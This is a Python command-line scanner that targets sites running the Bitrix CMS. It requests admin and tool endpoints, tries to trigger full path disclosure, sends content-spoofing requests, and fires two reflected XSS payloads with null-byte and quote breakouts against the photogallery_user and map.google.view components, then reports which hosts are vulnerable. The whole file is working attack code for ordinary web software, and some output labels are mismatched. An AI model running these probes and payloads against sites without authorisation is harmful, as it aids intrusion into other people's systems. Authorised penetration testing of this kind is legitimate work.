#!/usr/bin/env python3
"""
This script trying to find vulnerabilities for CMS Bitrix
"""
import time
import socket
import requests
from requests.exceptions import Timeout
from bs4 import BeautifulSoup
import argparse
import re

args = argparse.ArgumentParser(description=__doc__)
args.add_argument("-u", "--url", help="Address for scanning CMS Bitrix", required=True)


def print_red(text):
    print("\033[31m{}\033[0m".format(text), end=' ')


def print_green(text):
    print("\033[32m{}\033[0m".format(text), end=' ')


def start_scan(url):
    try:
        ip = socket.gethostbyname(url)
        print_green("[+]")
        print(f'Start scanning from: {url}')
        time.sleep(3)
        print_green("[+]")
        print(f'IP Address is: {ip}')
        time.sleep(3)
        print_green("[+]")
        print(f'Started: {time.ctime()}')
        time.sleep(3)
    except socket.gaierror as e:
        print(f'Invalid hostname, error raised is {e}')


def path(url):
    targeturls = ["/bitrix/admin/restore_export.php",
                  "/bitrix/admin/tools_index.php",
                  "/bitrix/bitrix.php", "/bitrix/modules/main/ajax_tools.php",
                  "/bitrix/php_interface/after_connect_d7.php",
                  "/bitrix/themes/.default/.description.php",
                  "/bitrix/components/bitrix/main.ui.selector/templates/.default/template.php",
                  "/components/bitrix/forum.user.profile.edit/templates/.default/interface.php"
                  ]
    fail = 0
    for target in targeturls:
        response = requests.get(f"http://{url}{target}", headers=user_agent)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            local_path = soup.find_all('b')[1].get_text()
            return local_path
        else:
            fail = response.status_code
    if fail != 0:
        return fail


def endpoints(url):
    targeturls = ["/bitrix/components/bitrix/desktop/admin_settings.php",
                  "/bitrix/components/bitrix/map.yandex.search/settings/settings.php",
                  "/bitrix/components/bitrix/player/player_playlist_edit.php",
                  "/bitrix/tools/autosave.php",
                  "/bitrix/tools/get_catalog_menu.php",
                  "/bitrix/tools/upload.php"
                  ]
    fail = 0
    for target in targeturls:
        response = requests.get(f"http://{url}{target}", headers=user_agent)
        if response.status_code == 200:
            return response.url
        else:
            fail = response.status_code
    if fail != 0:
        return fail


def spoofing_mobile(url):
    target = "/bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]=URL+IS+VULNERABLE&items[1][DETAIL_LINK]=http://google.com"
    response = requests.get(f"http://{url}{target}", headers=user_agent)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        if soup.find('a'):
            return response.url
    else:
        return response.status_code


def spoofing_imgage(url):
    target = "/bitrix/tools/imagepg.php?img=//i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"
    response = requests.get(f"http://{url}{target}", headers=user_agent)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        if soup.find('img'):
            return response.url
    else:
        return response.status_code


def reflected_xss1(url):
    target = "/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};alert(document.domain);if(1){//"
    response = requests.get(f"http://{url}{target}", headers=user_agent)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        if soup.find('p'):
            return None
        elif soup.find('script'):
            detect = soup.find('script')
            if detect.text in "<!-- deleted by bitrix WAF -->":
                return None
            else:
                return response.url
        else:
            return response.url
    else:
        return response.status_code


def reflected_xss2(url):
    target = "/bitrix/components/bitrix/map.google.view/settings/settings.php?arParams[API_KEY]=123'-'%00'-alert(document.domain)-'"
    response = requests.get(f"http://{url}{target}", headers=user_agent)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        if soup.find('body'):
            return None
        elif soup.find('p'):
            return None
        elif soup.find('script'):
            detect = soup.find('script')
            if detect.text in "<!-- deleted by bitrix WAF -->":
                return None
            else:
                return response.url
        else:
            return response.url
    else:
        return response.status_code


if __name__ == '__main__':
    options = args.parse_args()
    user_agent = {'User-agent': 'Mozilla/5.0'}
    url = re.sub(r'https?://|/.+','',str(options.url))
    try:
        requests.get(f"http://{url}", timeout=5, headers=user_agent)
    except Timeout as e:
        print(e)
    except Exception as e:
        print(e)
    else:
        #####################################################################
        #                           MAIN                                    #
        #####################################################################
        start_scan(url)
        fullpath = path(url)
        endpoint = endpoints(url)
        spoofing_mob = spoofing_mobile(url)
        spoofing_img = spoofing_imgage(url)
        xss_1 = reflected_xss1(url)
        xss_2 = reflected_xss2(url)
        if type(endpoint) == int:
            print_red("[-]")
            print("Admin Page")
            print(f" | Target is not vulnerable")
            print(f" | Response: {endpoint}")
        else:
            print_green("[+]")
            print("Admin Page")
            print(f" | Admin page found in: {endpoint}")
        time.sleep(3)
        if type(fullpath) == int:
            print_red("[-]")
            print("Full Path Disclosure")
            print(f" | Target is not vulnerable")
            print(f" | Response: {fullpath}")
        else:
            print_green("[+]")
            print("Full Path Disclosure")
            print(f" | Local path Bitrix in server is: {fullpath}")
        time.sleep(3)
        if type(spoofing_mob) == int:
            print_red("[-]")
            print("Content spoofing mobile")
            print(f" | Target is not vulnerable")
            print(f" | Response: {spoofing_mob}")
        elif spoofing_mob == None:
            print_red("[-]")
            print("Content spoofing mobile")
            print(f" | Target is not vulnerable")
        else:
            print_green("[+]")
            print("Content spoofing mobile")
            print(f" | Target is vulnerable: {spoofing_mob}")
        time.sleep(3)
        if type(spoofing_img) == int:
            print_red("[-]")
            print("Content spoofing image")
            print(f" | Target is not vulnerable")
            print(f" | Response: {spoofing_img}")
        elif spoofing_img == None:
            print_red("[-]")
            print("Content spoofing image")
            print(f" | Target is not vulnerable")
        else:
            print_green("[+]")
            print("Content spoofing image")
            print(f" | Target is vulnerable: {spoofing_img}")
        if type(xss_1) == int:
            print_red("[-]")
            print("Reflected XSS (map.google.view)")
            print(f" | Target is not vulnerable")
            print(f" | Response: {xss_1}")
        elif xss_1 == None:
            print_red("[-]")
            print("Reflected XSS (photogallery_user)")
            print(f" | Target is not vulnerable")
        else:
            print_green("[+]")
            print("Reflected XSS (photogallery_user)")
            print(f" | Target is vulnerable: {xss_1}")
        if type(xss_2) == int:
            print_red("[-]")
            print("Reflected XSS (map.google.view)")
            print(f" | Target is not vulnerable")
            print(f" | Response: {xss_2}")
        elif xss_2 == None:
            print_red("[-]")
            print("Reflected XSS (map.google.view)")
            print(f" | Target is not vulnerable")
        else:
            print_green("[+]")
            print("Reflected XSS (map.google.view)")
            print(f" | Target is vulnerable: {xss_2}")
